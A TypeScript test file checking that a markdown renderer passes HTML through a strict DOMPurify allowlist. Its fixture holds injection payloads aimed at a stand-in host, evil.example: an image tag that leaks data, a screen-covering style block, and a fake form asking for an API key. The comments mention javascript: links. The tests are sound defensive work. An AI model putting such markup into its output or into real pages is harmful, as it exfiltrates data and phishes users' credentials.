import type { Config } from "dompurify";
import { describe, expect, test } from "vitest";
import { MARKDOWN_SANITIZE_CONFIG, renderMarkdown } from "../src/markdown.js";

const injected = [
  "hello",
  "",
  '<img src="https://evil.example/p?d=leak">',
  "<style>div{position:fixed;inset:0;background:red}</style>",
  '<form action="https://evil.example/steal" method="post"><input name="k" placeholder="API key"><button>Save</button></form>',
  "",
  "| a | b |",
  "| - | - |",
  "| 1 | 2 |",
  "",
  "[docs](https://example.com) and `code`",
].join("\n");

describe("markdown sanitizer configuration", () => {
  test("hands marked's raw HTML to the sanitizer under the explicit allowlist without a DOMPurify profile", () => {
    const calls: { html: string; config: Config }[] = [];
    const rendered = renderMarkdown(injected, (html, config) => {
      calls.push({ html, config });
      return "sanitized";
    });

    expect(rendered).toBe("sanitized");
    expect(calls).toHaveLength(1);
    const [call] = calls;
    // marked passes the model's raw HTML and renders GFM tables, so the sanitizer allowlist is the only thing keeping these out of the DOM.
    expect(call?.html).toContain('<img src="https://evil.example/p?d=leak">');
    expect(call?.html).toContain("<style>");
    expect(call?.html).toContain('<form action="https://evil.example/steal"');
    expect(call?.html).toContain("<table>");
    expect(call?.html).toContain('<a href="https://example.com">docs</a>');
    expect(call?.html).toContain("<code>code</code>");
    expect(call?.config).toBe(MARKDOWN_SANITIZE_CONFIG);
  });

  test("does not combine USE_PROFILES with the allowlist, which DOMPurify documents as overriding ALLOWED_TAGS", () => {
    expect(MARKDOWN_SANITIZE_CONFIG).not.toHaveProperty("USE_PROFILES");
    expect(MARKDOWN_SANITIZE_CONFIG).not.toHaveProperty("ADD_TAGS");
    expect(MARKDOWN_SANITIZE_CONFIG).not.toHaveProperty("ADD_ATTR");
    const tags = MARKDOWN_SANITIZE_CONFIG.ALLOWED_TAGS ?? [];
    for (const banned of ["img", "style", "form", "input", "button", "table", "iframe", "video", "svg", "script"]) expect(tags).not.toContain(banned);
    for (const kept of ["a", "code", "pre", "p", "ul", "ol", "li", "blockquote", "h1", "strong", "em", "del", "hr", "br"]) expect(tags).toContain(kept);
    expect(MARKDOWN_SANITIZE_CONFIG.ALLOWED_ATTR).toEqual(["href", "rel", "target"]);
    expect(MARKDOWN_SANITIZE_CONFIG.FORBID_ATTR).toEqual(["style", "class", "id"]);
  });

  // A model can write any link it likes, and nothing in this config touches URI handling: that a javascript: or data: href is neutralised rests entirely on DOMPurify's defaults. Measured directly in Chromium against this exact config, `<a href="javascript:alert(1)">` sanitizes to `<a>` and a `data:text/html` href goes the same way — so the property holds, and these assertions are what keep the config from quietly opting out of it.
  //
  // It is asserted on the config rather than on rendered output because the one DOM this suite can run in, happy-dom, does not reproduce DOMPurify's real behaviour: under it the allowlist is not enforced at all, so a behavioural test here would pass while proving nothing.
  test("never widens what counts as a safe URI", () => {
    for (const weakening of [
      "ALLOWED_URI_REGEXP",
      "ADD_URI_SAFE_ATTR",
      "ALLOW_UNKNOWN_PROTOCOLS",
      "ALLOW_SELF_CLOSE_IN_ATTR",
      "WHOLE_DOCUMENT",
      "RETURN_DOM",
      "RETURN_DOM_FRAGMENT",
    ])
      expect(MARKDOWN_SANITIZE_CONFIG).not.toHaveProperty(weakening);
    // SANITIZE_DOM and the namespace checks are on by default; turning either off is how a sanitized string stops being one.
    for (const guard of ["SANITIZE_DOM", "SANITIZE_NAMED_PROPS", "ALLOW_ARIA_ATTR", "ALLOW_DATA_ATTR"])
      expect(MARKDOWN_SANITIZE_CONFIG[guard as keyof typeof MARKDOWN_SANITIZE_CONFIG]).toBeUndefined();
  });

  test("renders nothing when no sanitizer is available", () => {
    expect(renderMarkdown("**bold**", undefined)).toBe("");
  });
});
